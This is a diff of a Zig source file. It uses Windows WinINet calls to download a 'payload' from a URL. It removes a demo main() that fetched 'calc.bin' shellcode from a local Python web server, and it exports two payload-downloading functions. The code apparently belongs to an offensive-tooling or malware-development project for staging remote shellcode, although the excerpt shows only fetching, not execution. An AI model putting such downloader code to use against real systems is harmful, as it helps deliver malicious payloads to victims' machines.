@@ -1,6 +1,3 @@
-// Run the web server using the following command:
-// python3 -m http.server 8000
-
 const std = @import("std");
 const win = @import("zigwin32").everything;
 
@@ -15,18 +12,7 @@ const InternetReadFile = win.InternetReadFile;
 const InternetCloseHandle = win.InternetCloseHandle;
 const InternetSetOptionW = win.InternetSetOptionW;
 
-pub fn main() !void {
-    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
-    defer _ = gpa.deinit();
-    const allocator = gpa.allocator();
-
-    const payload = try getPayloadFromUrl(allocator, "http://127.0.0.1:8000/calc.bin");
-    defer allocator.free(payload);
-
-    std.debug.print("payload: {any}\n", .{payload});
-}
-
-fn getPayloadFromUrl(allocator: std.mem.Allocator, url: []const u8) ![]u8 {
+pub fn getPayloadFromUrl(allocator: std.mem.Allocator, url: []const u8) ![]u8 {
     const h_internet = InternetOpenW(
         null,
         0,
@@ -85,7 +71,7 @@ fn getPayloadFromUrl(allocator: std.mem.Allocator, url: []const u8) ![]u8 {
     return payload;
 }
 
-fn getPayloadFromUrl2(allocator: std.mem.Allocator, url: []const u8) ![]u8 {
+pub fn getPayloadFromUrl2(allocator: std.mem.Allocator, url: []const u8) ![]u8 {
     var client = std.http.Client{ .allocator = allocator };
     defer client.deinit();
 
